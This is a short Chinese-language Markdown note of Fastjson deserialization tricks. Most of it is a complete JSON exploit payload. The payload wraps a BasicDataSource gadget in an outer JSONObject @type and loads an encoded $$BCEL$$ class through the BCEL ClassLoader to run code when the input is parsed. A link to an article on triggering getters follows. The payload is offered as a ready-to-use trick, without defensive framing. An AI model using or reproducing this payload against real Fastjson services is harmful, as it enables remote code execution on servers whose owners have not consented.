# FastJson Trick.md

## parse调用parseObjetc

Fastjson反序列化的时候所用的是Parse而不是ParseObject，这里就会有一个Trick，就是在原本的@type上再嵌套一层@type，并设置为 '@type':"com.alibaba.fastjson.JSONObject",

```
{
    {
        '@type':"com.alibaba.fastjson.JSONObject",
        'a':
        {
            '@type':"org.apache.tomcat.dbcp.dbcp.BasicDataSource",
            'driverClassLoader':
            {
                '@type':"com.sun.org.apache.bcel.internal.util.ClassLoader"
            },
            'driverClassName':'$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$5dO$U1$U$3d$dd$af$ce$8e$b3$C$8b$a0$$$$$f2$a9$L$89$cc$8bo$Q$TB01$aeb$i$a2$d9$Y$S$3a$a5Y$8a$b33$cdL$d7$ac$bf$c8g$5e$d0$98$e8$P$f0G$Zn$t$E$fc$e8$c3m$ef$e99$e7$de$de$fe$fa$fd$fd$t$80$a7x$ec$e3$W$e6$7c$cc$e3$$$c7$3d$P$f7$3dt$3c$y8$e0$BG$d7$87$87E$8e$87$iK$M$8d$j$9dj$fb$8c$a1$da$dbx$c7P$db$cbN$U$c3T_$a7$ea$f5x$U$ab$fcP$c4$J$n$de$8eL$ae$98$ad$c8$K$f9$f1$950$e5$V$Z2$f8Q6$ce$a5z$ae$j5$d8$9f$98$q$d3v$ebL$7c$S$B$C$b48$96$D$ac$60$95a$daaa$o$d2a$Y$d9$5c$a7C$86f$Y$eb4$8cEq$caPy$o$Zz$99Q$e9R$Y$7d$$$ac$g$85$bb$c6$qZ$K$ab$b3$b4$I$f7D$o$c7$89$b0Y$be$r$8c$J$b0$86u$86$d9$d2Sg$e1$8b$83$fd$89T$c6Q$D$3cB$8b$81_$b5$f2W$e1$83$f8LI$82fn$a0$b7$e3$d4$ea$R$f5$ee$P$95$bdN$e6z$h$fd$ff8$db4$q5Q$ae$cf$de$87$fe$bf$cf$d9$feS$f1$s$cf$a4$w$KRL$Z$ba$b4$e5$dc$Os$n$V$96$e1$fe$c8$ad$K$98$h$R$c5$db$94uig$b4$d77$bf$82$9d$d3$81$b4$U$h$r$d8$a4$8f$9b$be$a6$k$a3$5e$a2$ab$dfPi$fc$40uPm$d7$a2A$ad$5d$8f$G$f5v$p$ba$A$7f$ff$F$de$cb$cd$L4$cfKb$87$dc$3d$aa$e7$M$e7I$M$aa$db$a1$acK$96$8bd$b9B$e63$84rT$8e8$da5$S$cd$96$N$de$b9$E5$c7$QjZ$C$A$A',
             "DefaultCatalog":"23333"
        }
    }:'b'
}
```
## parse触发get另一种思路
https://mp.weixin.qq.com/s?__biz=MzAxNTg0ODU4OQ==&mid=2650358489&idx=1&sn=2d1f600da6f01b644544331a844139ae&chksm=83f0273bb487ae2d85984c541adc7a928bdca396aa6ad3c0c349e2ef044558539f2f7075ad1f&mpshare=1&scene=23&srcid=1123yB78GUjwHduKmaU9BGSa&sharer_sharetime=1637650532436&sharer_shareid=18ef5175242004180f2ee4dd9c244e8a#rd

